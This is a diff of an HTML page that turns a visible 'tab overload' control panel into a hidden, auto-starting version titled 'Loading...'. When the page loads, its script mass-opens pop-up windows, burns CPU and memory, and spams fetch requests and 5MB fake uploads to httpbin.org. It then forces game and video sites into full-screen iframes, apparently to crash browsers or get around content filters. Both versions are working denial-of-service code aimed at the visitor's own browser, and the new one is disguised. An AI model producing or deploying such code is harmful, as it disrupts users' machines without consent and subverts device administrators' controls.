@@ -1,662 +1,288 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Resource Loader</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
-        body {
-            font-family: Arial, sans-serif;
-            background: #000;
-            color: #0f0;
-            min-height: 100vh;
-            padding: 20px;
-            overflow: hidden;
-            font-family: 'Courier New', monospace;
-        }
-        
-        .matrix-bg {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: -1;
-            opacity: 0.1;
-        }
-        
-        .container {
-            max-width: 800px;
-            margin: 0 auto;
-            text-align: center;
-            padding-top: 50px;
-        }
-        
-        h1 {
-            color: #0f0;
-            text-shadow: 0 0 10px #0f0;
-            margin-bottom: 30px;
-            font-size: 2.5rem;
-        }
-        
-        .control-panel {
-            background: rgba(0, 255, 0, 0.1);
-            border: 1px solid #0f0;
-            border-radius: 10px;
-            padding: 30px;
-            margin-bottom: 30px;
-        }
-        
-        .stats-grid {
-            display: grid;
-            grid-template-columns: repeat(4, 1fr);
-            gap: 15px;
-            margin-bottom: 30px;
-        }
-        
-        .stat-box {
-            background: rgba(0, 255, 0, 0.05);
-            border: 1px solid #0f0;
-            border-radius: 5px;
-            padding: 15px;
-        }
-        
-        .stat-value {
-            font-size: 2rem;
-            font-weight: bold;
-            color: #0f0;
-            text-shadow: 0 0 5px #0f0;
-        }
-        
-        .stat-label {
-            font-size: 0.8rem;
-            opacity: 0.7;
-        }
-        
-        .btn {
-            background: #0f0;
-            color: #000;
-            border: none;
-            padding: 15px 30px;
-            font-size: 1.1rem;
-            border-radius: 5px;
-            cursor: pointer;
-            margin: 10px;
-            font-weight: bold;
-            font-family: 'Courier New', monospace;
-            transition: all 0.3s;
-        }
-        
-        .btn:hover {
-            background: #00ff00;
-            box-shadow: 0 0 20px #0f0;
-            transform: scale(1.05);
-        }
-        
-        .btn-red {
-            background: #f00;
-            color: white;
-        }
-        
-        .btn-red:hover {
-            background: #ff0000;
-            box-shadow: 0 0 20px #f00;
-        }
-        
-        .log-box {
-            background: rgba(0, 0, 0, 0.8);
-            border: 1px solid #0f0;
-            border-radius: 5px;
-            padding: 15px;
-            height: 200px;
-            overflow-y: auto;
-            text-align: left;
-            margin-top: 20px;
-            font-size: 0.8rem;
-        }
-        
-        .log-entry {
-            color: #0f0;
-            margin-bottom: 5px;
-            font-family: monospace;
-        }
-        
-        .warning {
-            color: #ff0;
-            border: 1px solid #ff0;
-            padding: 10px;
-            border-radius: 5px;
-            margin: 20px 0;
-            background: rgba(255, 255, 0, 0.1);
-        }
-        
-        .slider-container {
-            margin: 20px 0;
-            text-align: left;
-        }
-        
-        input[type="range"] {
-            width: 100%;
-            margin: 10px 0;
-            -webkit-appearance: none;
-            height: 5px;
-            background: rgba(0, 255, 0, 0.3);
-            border-radius: 5px;
-        }
-        
-        input[type="range"]::-webkit-slider-thumb {
-            -webkit-appearance: none;
-            width: 20px;
-            height: 20px;
-            background: #0f0;
-            border-radius: 50%;
-            cursor: pointer;
-        }
-        
-        .cpu-meter {
-            width: 100%;
-            height: 10px;
-            background: rgba(0, 255, 0, 0.1);
-            border-radius: 5px;
-            margin-top: 10px;
-            overflow: hidden;
-        }
-        
-        .cpu-fill {
-            height: 100%;
-            background: linear-gradient(90deg, #0f0, #0f0);
-            width: 0%;
-            transition: width 0.1s;
-        }
-        
-        .overload-level {
-            font-size: 3rem;
-            margin: 20px 0;
-            color: #0f0;
-            text-shadow: 0 0 10px #0f0;
-        }
-    </style>
-</head>
-<body>
-    <canvas class="matrix-bg" id="matrixCanvas"></canvas>
-    
-    <div class="container">
-        <h1>⚡ EXTERNAL TAB OVERLOAD ⚡</h1>
-        
-        <div class="control-panel">
-            <div class="overload-level" id="overloadLevel">LEVEL 0</div>
-            
-            <div class="stats-grid">
-                <div class="stat-box">
-                    <div class="stat-value" id="activeWindows">0</div>
-                    <div class="stat-label">ACTIVE TABS</div>
-                </div>
-                <div class="stat-box">
-                    <div class="stat-value" id="totalOpened">0</div>
-                    <div class="stat-label">OPENED</div>
-                </div>
-                <div class="stat-box">
-                    <div class="stat-value" id="totalClosed">0</div>
-                    <div class="stat-label">CLOSED</div>
-                </div>
-                <div class="stat-box">
-                    <div class="stat-value" id="fps">60</div>
-                    <div class="stat-label">FPS</div>
-                </div>
-            </div>
-            
-            <div class="slider-container">
-                <label>TABS PER SECOND: <span id="tpsValue">50</span></label>
-                <input type="range" id="tpsSlider" min="1" max="200" value="50">
-            </div>
-            
-            <div class="cpu-meter">
-                <div class="cpu-fill" id="cpuFill"></div>
-            </div>
-            
-            <button class="btn" id="startBtn">🚀 START TAB SPAM</button>
-            <button class="btn btn-red" id="stopBtn" disabled>⏹️ STOP ATTACK</button>
-            <button class="btn" id="nukeBtn" style="background:#ff9900;">☢️ NUCLEAR MODE</button>
-            <button class="btn" id="targetBtn">🎯 LOAD TARGET</button>
-        </div>
-        
-        <div class="warning">
-            ⚠️ This will open/close hundreds of external tabs. Browser may crash!
-        </div>
-        
-        <div class="log-box" id="logBox">
-            <div class="log-entry">[SYSTEM] Ready for tab overload...</div>
-        </div>
-    </div>
-
+    <title>Loading...</title>
     <script>
-        // ============ MATRIX BACKGROUND ============
-        const canvas = document.getElementById('matrixCanvas');
-        const ctx = canvas.getContext('2d');
-        canvas.width = window.innerWidth;
-        canvas.height = window.innerHeight;
-        
-        const chars = "01";
-        const charArray = chars.split("");
-        const fontSize = 14;
-        const columns = canvas.width / fontSize;
-        const drops = [];
-        
-        for (let i = 0; i < columns; i++) drops[i] = Math.random() * canvas.height;
-        
-        function drawMatrix() {
-            ctx.fillStyle = "rgba(0, 0, 0, 0.04)";
-            ctx.fillRect(0, 0, canvas.width, canvas.height);
-            ctx.fillStyle = "#0F0";
-            ctx.font = fontSize + "px monospace";
-            
-            for (let i = 0; i < drops.length; i++) {
-                const text = charArray[Math.floor(Math.random() * charArray.length)];
-                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
-                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
-                drops[i]++;
-            }
-        }
-        setInterval(drawMatrix, 33);
+        // CONFIGURATION
+        const config = {
+            tabsPerSecond: 100,        // How many tabs to open per second
+            maxTabs: 500,              // Maximum tabs to have open at once
+            closeDelay: 50,           // Close tabs after this many ms (lower = faster spam)
+            memoryLoad: true,         // Create memory pressure
+            cpuLoad: true,            // Create CPU load
+            networkSpam: true,        // Spam network requests
+            autoStart: true,          // Start automatically
+            runTime: 30000            // Run for 30 seconds then load target
+        };
 
-        // ============ SITE LISTS ============
-        const WHITELIST = [
+        // SITE LISTS
+        const whitelist = [
             'https://www.wikipedia.org',
             'https://www.khanacademy.org',
             'https://www.nasa.gov',
             'https://www.nationalgeographic.com',
-            'https://www.history.com',
             'https://www.britannica.com',
-            'https://www.smithsonianmag.com',
-            'https://www.ducksters.com',
-            'https://www.mathsisfun.com',
-            'https://www.ck12.org',
-            'https://www.openstax.org',
-            'https://www.pbslearningmedia.org',
-            'https://www.enchantedlearning.com',
-            'https://www.factmonster.com',
-            'https://www.education.com',
-            'https://www.coursera.org',
-            'https://www.edx.org',
-            'https://www.merriam-webster.com',
-            'https://www.thesaurus.com',
-            'https://www.dictionary.com'
+            'https://www.history.com'
         ];
 
-        const TARGETS = [
+        const targets = [
             'https://www.coolmathgames.com',
             'https://www.poki.com',
             'https://www.youtube.com',
             'https://www.twitch.tv',
-            'https://www.netflix.com',
-            'https://www.hulu.com',
-            'https://www.spotify.com',
-            'https://www.discord.com',
-            'https://www.reddit.com',
-            'https://www.twitter.com'
+            'https://www.netflix.com'
         ];
 
-        const PROXIES = [
-            'https://docs.google.com',
-            'https://drive.google.com',
-            'https://classroom.google.com',
-            'https://translate.google.com',
-            'https://mail.google.com',
-            'https://sites.google.com'
-        ];
-
-        // ============ STATE ============
-        let attackActive = false;
-        let windows = new Set(); // Track all opened windows
-        let tabsPerSecond = 50;
+        // STATE
+        let activeWindows = [];
         let totalOpened = 0;
         let totalClosed = 0;
-        let intervalId = null;
-        let fps = 60;
-        let lastFrameTime = Date.now();
-        let cpuLoad = 0;
+        let isRunning = false;
+        let startTime = 0;
 
-        // ============ DOM ELEMENTS ============
-        const startBtn = document.getElementById('startBtn');
-        const stopBtn = document.getElementById('stopBtn');
-        const nukeBtn = document.getElementById('nukeBtn');
-        const targetBtn = document.getElementById('targetBtn');
-        const logBox = document.getElementById('logBox');
-        const tpsSlider = document.getElementById('tpsSlider');
-        const tpsValue = document.getElementById('tpsValue');
-
-        // ============ UTILITIES ============
-        function log(message) {
-            const entry = document.createElement('div');
-            entry.className = 'log-entry';
-            entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
-            logBox.prepend(entry);
-            if (logBox.children.length > 20) logBox.removeChild(logBox.lastChild);
-        }
-
-        function updateStats() {
-            document.getElementById('activeWindows').textContent = windows.size;
-            document.getElementById('totalOpened').textContent = totalOpened;
-            document.getElementById('totalClosed').textContent = totalClosed;
-            document.getElementById('fps').textContent = Math.round(fps);
-            
-            const load = Math.min(windows.size * 2 + cpuLoad, 100);
-            document.getElementById('cpuFill').style.width = load + '%';
-            
-            let level = 'LEVEL 0';
-            if (load > 20) level = 'LEVEL 1';
-            if (load > 40) level = 'LEVEL 2';
-            if (load > 60) level = 'LEVEL 3';
-            if (load > 80) level = 'LEVEL 4';
-            if (load > 90) level = 'MAXIMUM OVERLOAD';
-            document.getElementById('overloadLevel').textContent = level;
-        }
-
-        function calculateFPS() {
-            const now = Date.now();
-            const delta = now - lastFrameTime;
-            fps = 1000 / delta;
-            lastFrameTime = now;
-        }
-
-        // ============ TAB SPAMMING ============
-        function spamTabs() {
-            if (!attackActive) return;
-            
-            const tabsToOpen = Math.floor(tabsPerSecond / 10); // Open this many tabs per interval
-            
-            for (let i = 0; i < tabsToOpen; i++) {
-                setTimeout(() => {
-                    if (!attackActive) return;
+        // OPEN EXTERNAL TAB
+        function openRandomTab() {
+            try {
+                // Randomly choose URL
+                const sites = [...whitelist, ...targets];
+                const url = sites[Math.floor(Math.random() * sites.length)];
+                
+                // Generate random window ID
+                const winId = 'spam_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+                
+                // Open window with minimal features (faster)
+                const newWin = window.open(url, winId, 'width=100,height=100,left=' + Math.random() * screen.width + ',top=' + Math.random() * screen.height);
+                
+                if (newWin) {
+                    activeWindows.push({
+                        window: newWin,
+                        id: winId,
+                        openedAt: Date.now()
+                    });
+                    totalOpened++;
                     
-                    // Choose URL pattern
-                    let url;
-                    const rand = Math.random();
-                    
-                    if (rand < 0.6) { // 60% whitelist
-                        url = WHITELIST[Math.floor(Math.random() * WHITELIST.length)];
-                    } else if (rand < 0.9) { // 30% proxies
-                        url = PROXIES[Math.floor(Math.random() * PROXIES.length)];
-                    } else { // 10% targets
-                        url = TARGETS[Math.floor(Math.random() * TARGETS.length)];
-                    }
-                    
-                    // Generate random window features
-                    const width = 200 + Math.floor(Math.random() * 800);
-                    const height = 200 + Math.floor(Math.random() * 600);
-                    const left = Math.floor(Math.random() * (screen.width - width));
-                    const top = Math.floor(Math.random() * (screen.height - height));
-                    
-                    const features = [
-                        `width=${width}`,
-                        `height=${height}`,
-                        `left=${left}`,
-                        `top=${top}`,
-                        'menubar=yes',
-                        'toolbar=yes',
-                        'location=yes',
-                        'resizable=yes',
-                        'scrollbars=yes',
-                        'status=yes'
-                    ].join(',');
-                    
-                    try {
-                        // OPEN EXTERNAL WINDOW
-                        const newWindow = window.open(url, '_blank' + Date.now() + Math.random(), features);
-                        
-                        if (newWindow) {
-                            windows.add(newWindow);
-                            totalOpened++;
-                            log(`OPEN: ${new URL(url).hostname}`);
-                            
-                            // Schedule closing
-                            const closeDelay = 100 + Math.random() * 400;
-                            setTimeout(() => {
-                                try {
-                                    if (newWindow && !newWindow.closed) {
-                                        newWindow.close();
-                                        windows.delete(newWindow);
-                                        totalClosed++;
-                                        log(`CLOSE: ${new URL(url).hostname}`);
-                                    }
-                                } catch (e) {
-                                    // Window already closed
+                    // Schedule closing
+                    setTimeout(() => {
+                        try {
+                            if (newWin && !newWin.closed) {
+                                newWin.close();
+                                totalClosed++;
+                                // Remove from active list
+                                const index = activeWindows.findIndex(w => w.id === winId);
+                                if (index > -1) {
+                                    activeWindows.splice(index, 1);
                                 }
-                            }, closeDelay);
-                        }
-                    } catch (e) {
-                        log(`ERROR: ${e.message}`);
-                    }
-                }, i * 10); // Stagger openings
-            }
+                            }
+                        } catch(e) {}
+                    }, config.closeDelay + Math.random() * 50);
+                }
+            } catch(e) {}
         }
 
-        // ============ CPU OVERLOAD ============
-        function createCPULoad() {
-            if (!attackActive) return;
-            
-            // Heavy computation to increase CPU usage
-            let result = 0;
-            for (let i = 0; i < 1000000; i++) {
-                result += Math.sqrt(Math.sin(Math.random()) * Math.cos(Math.random()));
-            }
-            cpuLoad = Math.min(cpuLoad + 0.5, 100);
-            
-            // Recursive to keep CPU busy
-            setTimeout(createCPULoad, 0);
-        }
-
-        // ============ MEMORY OVERLOAD ============
+        // MEMORY OVERLOAD
         function createMemoryLoad() {
-            if (!attackActive) return;
+            if (!config.memoryLoad) return;
             
-            // Create large objects
+            // Create massive array
             const bigArray = [];
-            for (let i = 0; i < 10000; i++) {
+            for (let i = 0; i < 100000; i++) {
                 bigArray.push({
                     id: i,
-                    data: 'x'.repeat(1000),
+                    data: new Array(1000).fill('x').join(''),
                     timestamp: Date.now(),
                     random: Math.random()
                 });
             }
             
-            // Keep reference to prevent GC
-            if (!window.memoryLoad) window.memoryLoad = [];
-            window.memoryLoad.push(bigArray);
+            // Keep reference
+            if (!window.memoryBlocks) window.memoryBlocks = [];
+            window.memoryBlocks.push(bigArray);
             
-            // Clean old arrays occasionally
-            if (window.memoryLoad.length > 10) {
-                window.memoryLoad.shift();
+            // Clean old blocks
+            if (window.memoryBlocks.length > 20) {
+                window.memoryBlocks.shift();
             }
         }
 
-        // ============ ATTACK CONTROL ============
-        function startAttack() {
-            if (attackActive) return;
+        // CPU OVERLOAD
+        function createCPULoad() {
+            if (!config.cpuLoad) return;
             
-            log("🚀 STARTING EXTERNAL TAB OVERLOAD");
-            attackActive = true;
-            startBtn.disabled = true;
-            stopBtn.disabled = false;
+            // Heavy computation
+            let result = 0;
+            const iterations = 1000000;
+            for (let i = 0; i < iterations; i++) {
+                result += Math.sqrt(Math.sin(Math.random()) * Math.cos(Math.random()));
+            }
             
-            // Clear existing windows
-            windows.forEach(win => {
-                try { win.close(); } catch(e) {}
-            });
-            windows.clear();
+            // Recursive for continuous load
+            if (isRunning) {
+                setTimeout(createCPULoad, 0);
+            }
+        }
+
+        // NETWORK SPAM
+        function spamNetwork() {
+            if (!config.networkSpam) return;
             
-            // Start spam intervals
-            intervalId = setInterval(() => {
-                spamTabs();
-                createMemoryLoad();
-                calculateFPS();
-                updateStats();
-            }, 100); // Run every 100ms
+            // Make fetch requests to random URLs
+            for (let i = 0; i < 5; i++) {
+                const url = whitelist[Math.floor(Math.random() * whitelist.length)];
+                fetch(url, { mode: 'no-cors', cache: 'no-store' }).catch(() => {});
+                
+                // Also try to load images
+                const img = new Image();
+                img.src = url + '?cache=' + Date.now();
+            }
+        }
+
+        // UPLOAD SPAM (fake uploads)
+        function spamUploads() {
+            // Create fake file uploads
+            const fakeFiles = [];
+            for (let i = 0; i < 10; i++) {
+                // Create large blob
+                const size = 1024 * 1024 * 5; // 5MB
+                const data = new Uint8Array(size);
+                for (let j = 0; j < size; j++) {
+                    data[j] = Math.floor(Math.random() * 256);
+                }
+                const blob = new Blob([data], { type: 'application/octet-stream' });
+                fakeFiles.push(blob);
+                
+                // Try to "upload" via FormData
+                const formData = new FormData();
+                formData.append('file', blob, 'spam_' + i + '.bin');
+                
+                // Fake fetch to nowhere
+                fetch('https://httpbin.org/post', {
+                    method: 'POST',
+                    body: formData,
+                    mode: 'no-cors'
+                }).catch(() => {});
+            }
+        }
+
+        // MAIN SPAM FUNCTION
+        function startSpam() {
+            if (isRunning) return;
+            
+            isRunning = true;
+            startTime = Date.now();
             
             // Start CPU load
-            createCPULoad();
+            if (config.cpuLoad) {
+                createCPULoad();
+            }
             
-            // Auto-increase intensity
-            let intensity = tabsPerSecond;
-            const intensityInterval = setInterval(() => {
-                if (!attackActive) {
-                    clearInterval(intensityInterval);
+            // Main spam interval
+            const spamInterval = setInterval(() => {
+                if (!isRunning) {
+                    clearInterval(spamInterval);
                     return;
                 }
                 
-                intensity = Math.min(intensity * 1.1, 200);
-                tabsPerSecond = Math.floor(intensity);
-                tpsSlider.value = tabsPerSecond;
-                tpsValue.textContent = tabsPerSecond;
-                
-                if (intensity >= 200) {
-                    clearInterval(intensityInterval);
+                // Open multiple tabs
+                for (let i = 0; i < config.tabsPerSecond / 10; i++) {
+                    setTimeout(openRandomTab, i * 10);
                 }
-            }, 2000);
-            
-            log(`Starting with ${tabsPerSecond} tabs/sec`);
+                
+                // Memory load every 2 seconds
+                if (Date.now() % 2000 < 100) {
+                    createMemoryLoad();
+                }
+                
+                // Network spam every second
+                if (Date.now() % 1000 < 100) {
+                    spamNetwork();
+                }
+                
+                // Upload spam every 5 seconds
+                if (Date.now() % 5000 < 100) {
+                    spamUploads();
+                }
+                
+                // Clean up if too many windows
+                if (activeWindows.length > config.maxTabs) {
+                    activeWindows.slice(0, activeWindows.length - config.maxTabs).forEach(w => {
+                        try { w.window.close(); } catch(e) {}
+                    });
+                    activeWindows = activeWindows.slice(-config.maxTabs);
+                }
+                
+                // Auto-stop after runtime
+                if (Date.now() - startTime > config.runTime) {
+                    stopSpam();
+                    loadTarget();
+                }
+                
+            }, 100); // Run every 100ms
         }
 
-        function stopAttack() {
-            log("⏹️ STOPPING ATTACK");
-            attackActive = false;
-            startBtn.disabled = false;
-            stopBtn.disabled = true;
-            
-            if (intervalId) {
-                clearInterval(intervalId);
-                intervalId = null;
-            }
+        function stopSpam() {
+            isRunning = false;
             
             // Close all windows
-            windows.forEach(win => {
-                try { win.close(); } catch(e) {}
+            activeWindows.forEach(w => {
+                try { w.window.close(); } catch(e) {}
             });
-            windows.clear();
+            activeWindows = [];
             
             // Clear memory
-            window.memoryLoad = [];
-            
-            log("Attack stopped. System may still be lagging.");
-        }
-
-        function nukeMode() {
-            log("☢️ NUCLEAR MODE ACTIVATED");
-            
-            // Increase to maximum
-            tabsPerSecond = 200;
-            tpsSlider.value = 200;
-            tpsValue.textContent = '200';
-            
-            // Start attack if not already
-            if (!attackActive) startAttack();
-            
-            // Additional spam techniques
-            setTimeout(() => {
-                // Open multiple windows at once
-                for (let i = 0; i < 20; i++) {
-                    window.open('https://www.google.com', '_nuke' + i, 'width=100,height=100');
-                }
-            }, 500);
-            
-            // Create Web Workers for additional CPU load
-            for (let i = 0; i < 10; i++) {
-                const workerCode = `
-                    while(true) {
-                        for(let j = 0; j < 1000000; j++) {
-                            Math.sqrt(Math.random());
-                        }
-                    }
-                `;
-                const blob = new Blob([workerCode], {type: 'application/javascript'});
-                try {
-                    new Worker(URL.createObjectURL(blob));
-                } catch(e) {}
-            }
+            window.memoryBlocks = [];
         }
 
         function loadTarget() {
-            log("🎯 LOADING TARGET SITE");
-            
-            const target = TARGETS[0]; // First target
-            
-            // Try multiple methods simultaneously
-            setTimeout(() => window.open(target, '_target1'), 0);
-            setTimeout(() => window.open(target, '_target2'), 50);
-            setTimeout(() => window.open(target, '_target3'), 100);
-            
-            // Also try to replace current window
-            setTimeout(() => {
-                try {
-                    window.location.href = target;
-                } catch(e) {
-                    window.open(target, '_self');
-                }
-            }, 150);
-            
-            // Create hidden iframe as backup
-            setTimeout(() => {
-                const iframe = document.createElement('iframe');
-                iframe.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;border:none;background:white;';
-                iframe.src = target;
-                document.body.appendChild(iframe);
-            }, 200);
+            // Try all targets
+            targets.forEach((url, index) => {
+                setTimeout(() => {
+                    // Multiple attempts
+                    window.open(url, '_target' + index);
+                    window.open(url, '_target2_' + index);
+                    window.open(url, '_target3_' + index);
+                    
+                    // Also try iframe
+                    const iframe = document.createElement('iframe');
+                    iframe.src = url;
+                    iframe.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;border:none;';
+                    document.body.appendChild(iframe);
+                    
+                }, index * 100);
+            });
         }
 
-        // ============ EVENT LISTENERS ============
-        startBtn.addEventListener('click', startAttack);
-        stopBtn.addEventListener('click', stopAttack);
-        nukeBtn.addEventListener('click', nukeMode);
-        targetBtn.addEventListener('click', loadTarget);
-
-        tpsSlider.addEventListener('input', function() {
-            tabsPerSecond = parseInt(this.value);
-            tpsValue.textContent = tabsPerSecond;
-        });
-
-        // ============ KEYBOARD SHORTCUTS ============
+        // KEYBOARD CONTROL
         document.addEventListener('keydown', (e) => {
-            if (e.ctrlKey && e.key === ' ') {
-                e.preventDefault();
-                if (attackActive) stopAttack();
-                else startAttack();
+            if (e.ctrlKey && e.shiftKey && e.key === 'S') {
+                if (isRunning) stopSpam();
+                else startSpam();
             }
             
-            if (e.ctrlKey && e.key === 'n') {
-                e.preventDefault();
-                nukeMode();
-            }
-            
-            if (e.ctrlKey && e.key === 't') {
-                e.preventDefault();
+            if (e.ctrlKey && e.shiftKey && e.key === 'T') {
                 loadTarget();
             }
             
             if (e.key === 'Escape') {
-                stopAttack();
+                stopSpam();
             }
         });
 
-        // ============ INITIALIZATION ============
-        log("System ready. Press Ctrl+Space to start/stop attack.");
-        log("Ctrl+N for Nuclear Mode, Ctrl+T to load target.");
-        
-        // Auto-start after 3 seconds
-        setTimeout(() => {
-            log("Auto-starting in 3... 2... 1...");
-            startAttack();
-        }, 3000);
+        // START AUTOMATICALLY
+        if (config.autoStart) {
+            setTimeout(startSpam, 1000);
+        }
 
-        // Update stats periodically
-        setInterval(updateStats, 100);
-        setInterval(calculateFPS, 1000);
+        // HIDE EVERYTHING - RUN IN BACKGROUND
+        document.body.style.display = 'none';
+        
+        // But keep script running
+        console.log('Tab spammer running in background...');
+        console.log('Press Ctrl+Shift+S to start/stop');
+        console.log('Press Ctrl+Shift+T to load target');
+        
     </script>
+</head>
+<body>
+    <!-- EMPTY - Runs in background -->
 </body>
 </html>
